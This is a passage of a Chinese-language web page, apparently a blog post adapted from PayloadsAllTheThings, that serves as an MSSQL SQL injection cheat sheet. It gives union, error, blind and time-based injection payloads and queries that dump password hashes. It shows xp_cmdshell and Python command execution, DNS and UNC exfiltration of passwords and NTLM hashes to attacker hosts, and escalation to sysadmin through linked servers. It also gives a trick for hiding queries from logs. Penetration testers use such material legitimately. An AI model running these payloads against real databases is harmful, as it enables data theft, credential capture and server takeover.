<td>​<code>;%00</code>​</td>
<td>Null byte</td>
</tr>
</tbody></table>
<h3 id="MSSQL-用户"><a href="#MSSQL-用户" class="headerlink" title="MSSQL 用户"></a>MSSQL 用户</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">SELECT CURRENT_USER</span><br><span class="line">SELECT user_name();</span><br><span class="line">SELECT system_user;</span><br><span class="line">SELECT user;</span><br></pre></td></tr></table></figure>

<h3 id="MSSQL-版本查看"><a href="#MSSQL-版本查看" class="headerlink" title="MSSQL 版本查看"></a>MSSQL 版本查看</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT @@version</span><br></pre></td></tr></table></figure>

<h3 id="MSSQL-主机名"><a href="#MSSQL-主机名" class="headerlink" title="MSSQL 主机名"></a>MSSQL 主机名</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SELECT HOST_NAME()</span><br><span class="line">SELECT @@hostname</span><br><span class="line">SELECT @@SERVERNAME</span><br><span class="line">SELECT SERVERPROPERTY(&#x27;productversion&#x27;)</span><br><span class="line">SELECT SERVERPROPERTY(&#x27;productlevel&#x27;)</span><br><span class="line">SELECT SERVERPROPERTY(&#x27;edition&#x27;);</span><br></pre></td></tr></table></figure>

<h3 id="MSSQL-数据库名"><a href="#MSSQL-数据库名" class="headerlink" title="MSSQL 数据库名"></a>MSSQL 数据库名</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT DB_NAME()</span><br></pre></td></tr></table></figure>

<h3 id="MSSQL-数据库凭证"><a href="#MSSQL-数据库凭证" class="headerlink" title="MSSQL 数据库凭证"></a>MSSQL 数据库凭证</h3><ul>
<li><strong>MSSQL 2000</strong>: Hashcat mode 131: <code>0x01002702560500000000000000000000000000000000000000008db43dd9b1972a636ad0c7d4b8c515cb8ce46578</code>​<br>​<code>sql SELECT name, password FROM master..sysxlogins SELECT name, master.dbo.fn_varbintohexstr(password) FROM master..sysxlogins -- Need to convert to hex to return hashes in MSSQL error message / some version of query analyzer</code>​</li>
<li><strong>MSSQL 2005</strong>: Hashcat mode 132: <code>0x010018102152f8f28c8499d8ef263c53f8be369d799f931b2fbe</code>​<br>​<code>sql SELECT name, password_hash FROM master.sys.sql_logins SELECT name + &#39;-&#39; + master.sys.fn_varbintohexstr(password_hash) from master.sys.sql_logins</code>​</li>
</ul>
<h3 id="MSSQL-列出数据库"><a href="#MSSQL-列出数据库" class="headerlink" title="MSSQL 列出数据库"></a>MSSQL 列出数据库</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SELECT name FROM master..sysdatabases;</span><br><span class="line">SELECT DB_NAME(N); — for N = 0, 1, 2, …</span><br><span class="line">SELECT STRING_AGG(name, &#x27;, &#x27;) FROM master..sysdatabases; -- Change delimeter value such as &#x27;, &#x27; to anything else you want =&gt; master, tempdb, model, msdb   (Only works in MSSQL 2017+)</span><br></pre></td></tr></table></figure>

<h3 id="MSSQL-列出列"><a href="#MSSQL-列出列" class="headerlink" title="MSSQL 列出列"></a>MSSQL 列出列</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">SELECT name FROM syscolumns WHERE id = (SELECT id FROM sysobjects WHERE name = ‘mytable’); — for the current DB only</span><br><span class="line">SELECT master..syscolumns.name, TYPE_NAME(master..syscolumns.xtype) FROM master..syscolumns, master..sysobjects WHERE master..syscolumns.id=master..sysobjects.id AND master..sysobjects.name=’sometable’; — list colum names and types for master..sometable</span><br><span class="line"></span><br><span class="line">SELECT table_catalog, column_name FROM information_schema.columns</span><br></pre></td></tr></table></figure>

<h3 id="MSSQL-列出表"><a href="#MSSQL-列出表" class="headerlink" title="MSSQL 列出表"></a>MSSQL 列出表</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SELECT name FROM master..sysobjects WHERE xtype = ‘U’; — use xtype = ‘V’ for views</span><br><span class="line">SELECT name FROM someotherdb..sysobjects WHERE xtype = ‘U’;</span><br><span class="line">SELECT master..syscolumns.name, TYPE_NAME(master..syscolumns.xtype) FROM master..syscolumns, master..sysobjects WHERE master..syscolumns.id=master..sysobjects.id AND master..sysobjects.name=’sometable’; — list colum names and types for master..sometable</span><br><span class="line"></span><br><span class="line">SELECT table_catalog, table_name FROM information_schema.columns</span><br><span class="line">SELECT STRING_AGG(name, &#x27;, &#x27;) FROM master..sysobjects WHERE xtype = &#x27;U&#x27;; -- Change delimeter value such as &#x27;, &#x27; to anything else you want =&gt; trace_xe_action_map, trace_xe_event_map, spt_fallback_db, spt_fallback_dev, spt_fallback_usg, spt_monitor, MSreplication_options  (Only works in MSSQL 2017+)</span><br></pre></td></tr></table></figure>

<h3 id="MSSQL-联合注入"><a href="#MSSQL-联合注入" class="headerlink" title="MSSQL 联合注入"></a>MSSQL 联合注入</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">-- extract databases names</span><br><span class="line">$ SELECT name FROM master..sysdatabases</span><br><span class="line">[*] Injection</span><br><span class="line">[*] msdb</span><br><span class="line">[*] tempdb</span><br><span class="line"></span><br><span class="line">-- extract tables from Injection database</span><br><span class="line">$ SELECT name FROM Injection..sysobjects WHERE xtype = &#x27;U&#x27;</span><br><span class="line">[*] Profiles</span><br><span class="line">[*] Roles</span><br><span class="line">[*] Users</span><br><span class="line"></span><br><span class="line">-- extract columns for the table Users</span><br><span class="line">$ SELECT name FROM syscolumns WHERE id = (SELECT id FROM sysobjects WHERE name = &#x27;Users&#x27;)</span><br><span class="line">[*] UserId</span><br><span class="line">[*] UserName</span><br><span class="line"></span><br><span class="line">-- Finally extract the data</span><br><span class="line">$ SELECT  UserId, UserName from Users</span><br></pre></td></tr></table></figure>

<h3 id="MSSQL-报错注入"><a href="#MSSQL-报错注入" class="headerlink" title="MSSQL 报错注入"></a>MSSQL 报错注入</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">For integer inputs : convert(int,@@version)</span><br><span class="line">For integer inputs : cast((SELECT @@version) as int)</span><br><span class="line"></span><br><span class="line">For string inputs   : &#x27; + convert(int,@@version) + &#x27;</span><br><span class="line">For string inputs   : &#x27; + cast((SELECT @@version) as int) + &#x27;</span><br></pre></td></tr></table></figure>

<h3 id="MSSQL-盲注"><a href="#MSSQL-盲注" class="headerlink" title="MSSQL 盲注"></a>MSSQL 盲注</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">AND LEN(SELECT TOP 1 username FROM tblusers)=5 ; -- -</span><br><span class="line"></span><br><span class="line">AND ASCII(SUBSTRING(SELECT TOP 1 username FROM tblusers),1,1)=97</span><br><span class="line">AND UNICODE(SUBSTRING((SELECT &#x27;A&#x27;),1,1))&gt;64-- </span><br><span class="line">AND SELECT SUBSTRING(table_name,1,1) FROM information_schema.tables &gt; &#x27;A&#x27;</span><br><span class="line"></span><br><span class="line">AND ISNULL(ASCII(SUBSTRING(CAST((SELECT LOWER(db_name(0)))AS varchar(8000)),1,1)),0)&gt;90</span><br><span class="line"></span><br><span class="line">SELECT @@version WHERE @@version LIKE &#x27;%12.0.2000.8%&#x27;</span><br><span class="line"></span><br><span class="line">WITH data AS (SELECT (ROW_NUMBER() OVER (ORDER BY message)) as row,* FROM log_table)</span><br><span class="line">SELECT message FROM data WHERE row = 1 and message like &#x27;t%&#x27;</span><br></pre></td></tr></table></figure>

<h3 id="MSSQL-时间注入"><a href="#MSSQL-时间注入" class="headerlink" title="MSSQL 时间注入"></a>MSSQL 时间注入</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">ProductID=1;waitfor delay &#x27;0:0:10&#x27;--</span><br><span class="line">ProductID=1);waitfor delay &#x27;0:0:10&#x27;--</span><br><span class="line">ProductID=1&#x27;;waitfor delay &#x27;0:0:10&#x27;--</span><br><span class="line">ProductID=1&#x27;);waitfor delay &#x27;0:0:10&#x27;--</span><br><span class="line">ProductID=1));waitfor delay &#x27;0:0:10&#x27;--</span><br><span class="line"></span><br><span class="line">IF([INFERENCE]) WAITFOR DELAY &#x27;0:0:[SLEEPTIME]&#x27;</span><br><span class="line">IF 1=1 WAITFOR DELAY &#x27;0:0:5&#x27; ELSE WAITFOR DELAY &#x27;0:0:0&#x27;;</span><br></pre></td></tr></table></figure>

<h3 id="MSSQL-堆栈查询"><a href="#MSSQL-堆栈查询" class="headerlink" title="MSSQL 堆栈查询"></a>MSSQL 堆栈查询</h3><ul>
<li>Without any statement terminator <code>-- multiple SELECT statements SELECT &#39;A&#39;SELECT &#39;B&#39;SELECT &#39;C&#39; -- updating password with a stacked query SELECT id, username, password FROM users WHERE username = &#39;admin&#39;exec(&#39;update[users]set[password]=&#39;&#39;a&#39;&#39;&#39;)-- -- using the stacked query to enable xp_cmdshell -- you won&#39;t have the output of the query, redirect it to a file SELECT id, username, password FROM users WHERE username = &#39;admin&#39;exec(&#39;sp_configure&#39;&#39;show advanced option&#39;&#39;,&#39;&#39;1&#39;&#39;reconfigure&#39;)exec(&#39;sp_configure&#39;&#39;xp_cmdshell&#39;&#39;,&#39;&#39;1&#39;&#39;reconfigure&#39;)--</code>​</li>
<li>Use a semi-colon “;” to add another query<br>​<code>sql ProductID=1; DROP members--</code>​</li>
</ul>
<h3 id="MSSQL-读取文件"><a href="#MSSQL-读取文件" class="headerlink" title="MSSQL 读取文件"></a>MSSQL 读取文件</h3><p><strong>Permissions</strong>: The <code>BULK</code>​ option requires the <code>ADMINISTER BULK OPERATIONS</code>​ or the <code>ADMINISTER DATABASE BULK OPERATIONS</code>​ permission.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1 union select null,(select x from OpenRowset(BULK &#x27;C:\Windows\win.ini&#x27;,SINGLE_CLOB) R(x)),null,null</span><br></pre></td></tr></table></figure>

<h3 id="MSSQL-命令执行"><a href="#MSSQL-命令执行" class="headerlink" title="MSSQL 命令执行"></a>MSSQL 命令执行</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">EXEC xp_cmdshell &quot;net user&quot;;</span><br><span class="line">EXEC master.dbo.xp_cmdshell &#x27;cmd.exe dir c:&#x27;;</span><br><span class="line">EXEC master.dbo.xp_cmdshell &#x27;ping 127.0.0.1&#x27;;</span><br></pre></td></tr></table></figure>

<p>重新激活 xp_cmdshell（在 SQL Server 2005 中默认禁用）</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">EXEC sp_configure &#x27;show advanced options&#x27;,1;</span><br><span class="line">RECONFIGURE;</span><br><span class="line">EXEC sp_configure &#x27;xp_cmdshell&#x27;,1;</span><br><span class="line">RECONFIGURE;</span><br></pre></td></tr></table></figure>

<p>与 MSSQL 实例交互。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sqsh -S 192.168.1.X -U sa -P superPassword</span><br><span class="line">python mssqlclient.py WORKGROUP/Administrator:password@192.168.1X -port 46758</span><br></pre></td></tr></table></figure>

<p>执行 Python 脚本</p>
<blockquote>
<p>由与使用 xp_cmdshell 执行命令的用户不同的用户执行</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">#Print the user being used (and execute commands)</span><br><span class="line">EXECUTE sp_execute_external_script @language = N&#x27;Python&#x27;, @script = N&#x27;print(__import__(&quot;getpass&quot;).getuser())&#x27;</span><br><span class="line">EXECUTE sp_execute_external_script @language = N&#x27;Python&#x27;, @script = N&#x27;print(__import__(&quot;os&quot;).system(&quot;whoami&quot;))&#x27;</span><br><span class="line">#Open and read a file</span><br><span class="line">EXECUTE sp_execute_external_script @language = N&#x27;Python&#x27;, @script = N&#x27;print(open(&quot;C:\\inetpub\\wwwroot\\web.config&quot;, &quot;r&quot;).read())&#x27;</span><br><span class="line">#Multiline</span><br><span class="line">EXECUTE sp_execute_external_script @language = N&#x27;Python&#x27;, @script = N&#x27;</span><br><span class="line">import sys</span><br><span class="line">print(sys.version)</span><br><span class="line">&#x27;</span><br><span class="line">GO</span><br></pre></td></tr></table></figure>

<h3 id="MSSQL-外带数据"><a href="#MSSQL-外带数据" class="headerlink" title="MSSQL 外带数据"></a>MSSQL 外带数据</h3><h4 id="MSSQL-DNS-外带数据"><a href="#MSSQL-DNS-外带数据" class="headerlink" title="MSSQL DNS 外带数据"></a>MSSQL DNS 外带数据</h4><p>Technique from <a target="_blank" rel="noopener" href="https://twitter.com/ptswarm/status/1313476695295512578/photo/1">https://twitter.com/ptswarm/status/1313476695295512578/photo/1</a></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># Permissions: Requires VIEW SERVER STATE permission on the server.</span><br><span class="line">1 and exists(select * from fn_xe_file_target_read_file(&#x27;C:\*.xel&#x27;,&#x27;\\&#x27;%2b(select pass from users where id=1)%2b&#x27;.xxxx.burpcollaborator.net\1.xem&#x27;,null,null))</span><br><span class="line"></span><br><span class="line"># Permissions: Requires the CONTROL SERVER permission.</span><br><span class="line">1 (select 1 where exists(select * from fn_get_audit_file(&#x27;\\&#x27;%2b(select pass from users where id=1)%2b&#x27;.xxxx.burpcollaborator.net\&#x27;,default,default)))</span><br><span class="line">1 and exists(select * from fn_trace_gettable(&#x27;\\&#x27;%2b(select pass from users where id=1)%2b&#x27;.xxxx.burpcollaborator.net\1.trc&#x27;,default))</span><br></pre></td></tr></table></figure>

<h4 id="MSSQL-UNC-路径"><a href="#MSSQL-UNC-路径" class="headerlink" title="MSSQL UNC 路径"></a>MSSQL UNC 路径</h4><p>MSSQL supports stacked queries so we can create a variable pointing to our IP address then use the <code>xp_dirtree</code>​ function to list the files in our SMB share and grab the NTLMv2 hash.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;; use master; exec xp_dirtree &#x27;\\10.10.15.XX\SHARE&#x27;;-- </span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">xp_dirtree &#x27;\\attackerip\file&#x27;</span><br><span class="line">xp_fileexist &#x27;\\attackerip\file&#x27;</span><br><span class="line">BACKUP LOG [TESTING] TO DISK = &#x27;\\attackerip\file&#x27;</span><br><span class="line">BACKUP DATABASE [TESTING] TO DISK = &#x27;\\attackeri\file&#x27;</span><br><span class="line">RESTORE LOG [TESTING] FROM DISK = &#x27;\\attackerip\file&#x27;</span><br><span class="line">RESTORE DATABASE [TESTING] FROM DISK = &#x27;\\attackerip\file&#x27;</span><br><span class="line">RESTORE HEADERONLY FROM DISK = &#x27;\\attackerip\file&#x27;</span><br><span class="line">RESTORE FILELISTONLY FROM DISK = &#x27;\\attackerip\file&#x27;</span><br><span class="line">RESTORE LABELONLY FROM DISK = &#x27;\\attackerip\file&#x27;</span><br><span class="line">RESTORE REWINDONLY FROM DISK = &#x27;\\attackerip\file&#x27;</span><br><span class="line">RESTORE VERIFYONLY FROM DISK = &#x27;\\attackerip\file&#x27;</span><br></pre></td></tr></table></figure>

<h4 id="MSSQL-提升权限为-DB-管理员"><a href="#MSSQL-提升权限为-DB-管理员" class="headerlink" title="MSSQL 提升权限为 DB 管理员"></a>MSSQL 提升权限为 DB 管理员</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">EXEC master.dbo.sp_addsrvrolemember &#x27;user&#x27;, &#x27;sysadmin;</span><br></pre></td></tr></table></figure>

<h4 id="MSSQL-受信任链接"><a href="#MSSQL-受信任链接" class="headerlink" title="MSSQL 受信任链接"></a>MSSQL 受信任链接</h4><blockquote>
<p>The links between databases work even across forest trusts.</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msf&gt; use exploit/windows/mssql/mssql_linkcrawler</span><br><span class="line">[msf&gt; set DEPLOY true] #Set DEPLOY to true if you want to abuse the privileges to obtain a meterpreter sessio</span><br></pre></td></tr></table></figure>

<p>Manual exploitation</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">-- find link</span><br><span class="line">select * from master..sysservers</span><br><span class="line"></span><br><span class="line">-- execute query through the link</span><br><span class="line">select * from openquery(&quot;dcorp-sql1&quot;, &#x27;select * from master..sysservers&#x27;)</span><br><span class="line">select version from openquery(&quot;linkedserver&quot;, &#x27;select @@version as version&#x27;);</span><br><span class="line"></span><br><span class="line">-- chain multiple openquery</span><br><span class="line">select version from openquery(&quot;link1&quot;,&#x27;select version from openquery(&quot;link2&quot;,&quot;select @@version as version&quot;)&#x27;)</span><br><span class="line"></span><br><span class="line">-- execute shell commands</span><br><span class="line">EXECUTE(&#x27;sp_configure &#x27;&#x27;xp_cmdshell&#x27;&#x27;,1;reconfigure;&#x27;) AT LinkedServer</span><br><span class="line">select 1 from openquery(&quot;linkedserver&quot;,&#x27;select 1;exec master..xp_cmdshell &quot;dir c:&quot;&#x27;)</span><br><span class="line"></span><br><span class="line">-- create user and give admin privileges</span><br><span class="line">EXECUTE(&#x27;EXECUTE(&#x27;&#x27;CREATE LOGIN hacker WITH PASSWORD = &#x27;&#x27;&#x27;&#x27;P@ssword123.&#x27;&#x27;&#x27;&#x27; &#x27;&#x27;) AT &quot;DOMINIO\SERVER1&quot;&#x27;) AT &quot;DOMINIO\SERVER2&quot;</span><br><span class="line">EXECUTE(&#x27;EXECUTE(&#x27;&#x27;sp_addsrvrolemember &#x27;&#x27;&#x27;&#x27;hacker&#x27;&#x27;&#x27;&#x27; , &#x27;&#x27;&#x27;&#x27;sysadmin&#x27;&#x27;&#x27;&#x27; &#x27;&#x27;) AT &quot;DOMINIO\SERVER1&quot;&#x27;) AT &quot;DOMINIO\SERVER2&quot;</span><br></pre></td></tr></table></figure>

<h4 id="列出权限"><a href="#列出权限" class="headerlink" title="列出权限"></a>列出权限</h4><h5 id="列出当前用户在服务器上的有效权限。"><a href="#列出当前用户在服务器上的有效权限。" class="headerlink" title="列出当前用户在服务器上的有效权限。"></a>列出当前用户在服务器上的有效权限。</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM fn_my_permissions(NULL, &#x27;SERVER&#x27;); </span><br></pre></td></tr></table></figure>

<h5 id="列出当前用户在数据库上的有效权限。"><a href="#列出当前用户在数据库上的有效权限。" class="headerlink" title="列出当前用户在数据库上的有效权限。"></a>列出当前用户在数据库上的有效权限。</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM fn_my_permissions (NULL, &#x27;DATABASE&#x27;);</span><br></pre></td></tr></table></figure>

<h5 id="列出当前用户在视图上的有效权限。"><a href="#列出当前用户在视图上的有效权限。" class="headerlink" title="列出当前用户在视图上的有效权限。"></a>列出当前用户在视图上的有效权限。</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM fn_my_permissions(&#x27;Sales.vIndividualCustomer&#x27;, &#x27;OBJECT&#x27;) ORDER BY subentity_name, permission_name; </span><br></pre></td></tr></table></figure>

<h5 id="检查当前用户是否属于指定的服务器角色。"><a href="#检查当前用户是否属于指定的服务器角色。" class="headerlink" title="检查当前用户是否属于指定的服务器角色。"></a>检查当前用户是否属于指定的服务器角色。</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">-- possible roles: sysadmin, serveradmin, dbcreator, setupadmin, bulkadmin, securityadmin, diskadmin, public, processadmin</span><br><span class="line">SELECT is_srvrolemember(&#x27;sysadmin&#x27;);</span><br></pre></td></tr></table></figure>

<p>在查询中使用 <code>SP_PASSWORD</code>​ 以隐藏日志，如：<code>&#39; AND 1=1--sp_password</code>​</p>
<h4 id="MSSQL-OPSEC"><a href="#MSSQL-OPSEC" class="headerlink" title="MSSQL OPSEC"></a>MSSQL OPSEC</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">-- &#x27;sp_password&#x27; was found in the text of this event.</span><br><span class="line">-- The text has been replaced with this comment for security reasons.</span><br></pre></td></tr></table></figure>

<h3 id="References"><a href="#References" class="headerlink" title="References"></a>References</h3><blockquote>
<p>注：大部分内容翻译至：<a target="_blank" rel="noopener" href="http://doc.vulexp.cn/?golink=aHR0cHM6Ly9naXRodWIuY29tL3N3aXNza3lyZXBvL1BheWxvYWRzQWxsVGhlVGhpbmdz">https://github.com/swisskyrepo/PayloadsAllTheThings</a></p>
</blockquote>
<ul>
<li><a target="_blank" rel="noopener" href="http://doc.vulexp.cn/?golink=aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vamVycnlsb2NrZXIvcC8xMDkzODg5OS5odG1s">MSSQL渗透测试</a></li>
<li><a target="_blank" rel="noopener" href="http://doc.vulexp.cn/?golink=aHR0cDovL3BlbnRlc3Rtb25rZXkubmV0L2NoZWF0LXNoZWV0L3NxbC1pbmplY3Rpb24vbXNzcWwtc3FsLWluamVjdGlvbi1jaGVhdC1zaGVldA==">Pentest Monkey – mssql-sql-injection-cheat-sheet</a></li>
<li><a target="_blank" rel="noopener" href="http://doc.vulexp.cn/?golink=aHR0cHM6Ly9naXRodWIuY29tL2luY3JlZGlibGVpbmRpc2hlbGwvZXhwbG9pdC1jb2RlLWJ5LW1lL2Jsb2IvbWFzdGVyL01TU1FMJTIwRXJyb3ItQmFzZWQlMjBTUUwlMjBJbmplY3Rpb24lMjBPcmRlciUyMGJ5JTIwY2xhdXNlL0Vycm9yJTIwYmFzZWQlMjBTUUwlMjBJbmplY3Rpb24lMjBpbiUyMOKAnE9yZGVyJTIwQnnigJ0lMjBjbGF1c2UlMjAoTVNTUUwpLnBkZg==">Error Based – SQL Injection</a></li>
<li><a target="_blank" rel="noopener" href="http://doc.vulexp.cn/?golink=aHR0cHM6Ly9ib29rLmhhY2t0cmlja3MueHl6L3dpbmRvd3MvYWN0aXZlLWRpcmVjdG9yeS1tZXRob2RvbG9neS9tc3NxbC10cnVzdGVkLWxpbmtz">MSSQL Trusted Links – HackTricks.xyz</a></li>
<li><a target="_blank" rel="noopener" href="http://doc.vulexp.cn/?golink=aHR0cHM6Ly9ibG9nLm5ldHNwaS5jb20vaG93LXRvLWhhY2stZGF0YWJhc2UtbGlua3MtaW4tc3FsLXNlcnZlci8=">SQL Server – Link… Link… Link… and Shell: How to Hack Database Links in SQL Server! – Antti Rantasaari – June 6th, 2013</a></li>
<li><a target="_blank" rel="noopener" href="http://doc.vulexp.cn/?golink=aHR0cHM6Ly9naXRodWIuY29tL05ldFNQSS9EQUZU">DAFT: Database Audit Framework &amp; Toolkit – NetSPI</a></li>
<li><a target="_blank" rel="noopener" href="http://doc.vulexp.cn/?golink=aHR0cHM6Ly9naXN0LmdpdGh1Yi5jb20vbnVsbGJpbmQvN2RmY2EyYTYzMDlhNDIwOWI1YWVlZjE4MWI2NzZjNmU=">SQL Server UNC Path Injection Cheatsheet – nullbind</a></li>
<li><a target="_blank" rel="noopener" href="http://doc.vulexp.cn/?golink=aHR0cHM6Ly93d3cuZXhwbG9pdC1kYi5jb20vcGFwZXJzLzEyOTc1">Full MSSQL Injection PWNage – ZeQ3uL &amp;&amp; JabAv0C – 28 January 2009</a></li>
<li><a target="_blank" rel="noopener" href="http://doc.vulexp.cn/?golink=aHR0cHM6Ly9kb2NzLm1pY3Jvc29mdC5jb20vZW4tdXMvc3FsL3JlbGF0aW9uYWwtZGF0YWJhc2VzL3N5c3RlbS1mdW5jdGlvbnMvc3lzLWZuLW15LXBlcm1pc3Npb25zLXRyYW5zYWN0LXNxbD92aWV3PXNxbC1zZXJ2ZXItdmVyMTU=">Microsoft – sys.fn_my_permissions (Transact-SQL)</a></li>
<li><a target="_blank" rel="noopener" href="http://doc.vulexp.cn/?golink=aHR0cHM6Ly9kb2NzLm1pY3Jvc29mdC5jb20vZW4tdXMvc3FsL3Qtc3FsL2Z1bmN0aW9ucy9pcy1zcnZyb2xlbWVtYmVyLXRyYW5zYWN0LXNxbD92aWV3PXNxbC1zZXJ2ZXItdmVyMTU=">Microsoft – IS_SRVROLEMEMBER (Transact-SQL)</a></li>
<li><a target="_blank" rel="noopener" href="http://doc.vulexp.cn/?golink=aHR0cHM6Ly93d3cuZ29zZWN1cmUubmV0L2Jsb2cvMjAyMy8wNi8yMS9hd3Mtd2FmLWNsaWVudHMtbGVmdC12dWxuZXJhYmxlLXRvLXNxbC1pbmplY3Rpb24tZHVlLXRvLXVub3J0aG9kb3gtbXNzcWwtZGVzaWduLWNob2ljZS8=">AWS WAF Clients Left Vulnerable to SQL Injection Due to Unorthodox MSSQL Design Choice – Marc Olivier Bergeron – Jun 21, 2023</a></li>
</ul>
<h2 id="oracle"><a href="#oracle" class="headerlink" title="oracle"></a>oracle</h2><p>相关工具：</p>
<ul>
<li><a target="_blank" rel="noopener" href="http://doc.vulexp.cn/?golink=aHR0cHM6Ly9naXRodWIuY29tL1NhZmVHcm9jZXJ5U3RvcmUvTURVVA==">MDUT</a></li>
</ul>
<h3 id="oracle查最大数量表"><a href="#oracle查最大数量表" class="headerlink" title="oracle查最大数量表"></a>oracle查最大数量表</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">select t.table_name,t.tablespace_name,t.owner,t.num_rows from  all_tables t  ORDER BY NUM_ROWS DESC;</span><br><span class="line"></span><br><span class="line">select t.table_name,t.tablespace_name,t.owner,t.num_rows from  all_tables t  ORDER BY NUM_ROWS DESC;</span><br><span class="line">select t.table_name tableName, f.comments comments</span><br><span class="line">  from user_tables t</span><br><span class="line"> inner join user_tab_comments f</span><br><span class="line">    on t.table_name = f.table_name</span><br></pre></td></tr></table></figure>

